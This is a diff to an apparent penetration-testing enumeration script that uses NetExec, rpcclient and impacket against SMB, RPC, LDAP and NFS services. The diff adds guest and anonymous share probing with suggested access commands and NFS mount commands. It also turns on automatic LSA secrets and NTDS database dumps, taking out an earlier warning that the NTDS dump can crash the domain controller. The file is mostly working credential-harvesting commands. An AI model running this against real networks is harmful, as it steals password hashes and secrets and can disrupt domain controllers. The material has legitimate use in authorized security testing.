@@ -64,6 +64,7 @@ if [ -n "$user" ]; then
     fi
 else
     USER_FLAG=""
+    RPC_ARG="-U '' -N"
 fi
 
 HEADER='\033[95m'
@@ -91,17 +92,71 @@ fi
 # Guest access (domain optional)
 echo -e "\n\033[96m[+] Checking Guest access\033[0m"
 if [ -n "$domain" ]; then
-    nxc smb $IP -d "$domain" -u 'guest' -p '' # check for guest access
+    guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
 else
-    nxc smb $IP -u 'guest' -p '' # check for guest access
+    guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
+fi
+echo "$guest_output"
+
+# Check if guest access succeeded and suggest commands
+if echo "$guest_output" | grep -q "\[+\]" && ! echo "$guest_output" | grep -q "Error enumerating shares"; then
+    # Check if we actually have accessible shares
+    has_shares=false
+    echo "$guest_output" | while read -r line; do
+        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+        if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+            has_shares=true
+            break
+        fi
+    done
+    
+    if echo "$guest_output" | grep -qE "READ|WRITE"; then
+        echo -e "\n\033[92m[+] Guest SMB access successful! Suggested commands:\033[0m"
+        echo "rpcclient -U 'guest%' $IP"
+        
+        # Suggest specific shares if found
+        echo "$guest_output" | while read -r line; do
+            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
+                share=${share#\\}
+                if [ ! -z "$share" ]; then
+                    echo "smbclient -U 'guest%' //$IP/$share"
+                fi
+            fi
+        done
+        echo ""
+    fi
 fi
 
 # Anonymous access (domain optional)
 echo -e "\n\033[96m[+] Checking Anonymous access\033[0m"
 if [ -n "$domain" ]; then
-    nxc smb $IP -d "$domain" -u '' -p '' # check for anonymous access
+    anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
 else
-    nxc smb $IP -u '' -p '' # check for anonymous access
+    anon_output=$(nxc smb $IP -u '' -p '' --shares)
+fi
+echo "$anon_output"
+
+# Check if anonymous access succeeded and suggest commands
+if echo "$anon_output" | grep -q "\[+\]" && ! echo "$anon_output" | grep -q "Error enumerating shares"; then
+    if echo "$anon_output" | grep -qE "READ|WRITE"; then
+        echo -e "\n\033[92m[+] Anonymous SMB access successful! Suggested commands:\033[0m"
+        echo "rpcclient -U '' -N $IP"
+        
+        # Suggest specific shares if found
+        echo "$anon_output" | while read -r line; do
+            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
+                share=${share#\\}
+                if [ ! -z "$share" ]; then
+                    echo "smbclient -U '' -N //$IP/$share"
+                fi
+            fi
+        done
+        echo ""
+    fi
 fi
 
 echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
@@ -111,7 +166,23 @@ echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
 timeout 5s nxc ldap $IP -u '' -p '' --timeout 2
 
 echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
-unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt
+nfs_output=$(unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt)
+echo "$nfs_output"
+
+# Check for NFS shares and suggest mount commands
+if echo "$nfs_output" | grep -qE "r--|rw-|rwx"; then
+    echo -e "\n\033[92m[+] NFS shares found! Suggested mount commands:\033[0m"
+    echo "$nfs_output" | grep -E "r--|rw-|rwx" | while read -r line; do
+        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+        # Extract the share path (starts with /)
+        nfs_share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) {print $i; exit}}'| head -n1)
+        if [ ! -z "$nfs_share" ]; then
+            echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
+            echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
+        fi
+    done
+    echo ""
+fi
 
 
 
@@ -241,8 +312,12 @@ rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
 rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
 rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
 
-echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
-impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+if [ -n "$user" ]; then
+    echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
+    impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+else
+    echo -e "\n\033[93m[!] Skipping RPC Secrets Dump (no credentials supplied)\033[0m"
+fi
 
 echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
 impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
@@ -444,11 +519,11 @@ if [ -n "$user" ]; then
     echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
     unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
 
-    echo -e "\n\033[91m[+] NTDS Database Dump (SKIPPED - Risky & Slow)\033[0m\n"
-    echo "Skipping automatic NTDS dump as it can crash the DC and takes a long time."
-    echo "To dump manually (safer): nxc smb $IP $USER_FLAG -M ntdsutil"
-    echo "To dump manually (risky): nxc smb $IP $USER_FLAG --ntds"
-    # unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
+    echo -e "\n\033[91m[+] LSA Secrets Dump\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt
+
+    echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
+    unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
 else
     echo -e "\n\033[93m[!] Skipping Additional Enumeration (no username supplied)\033[0m"
 fi
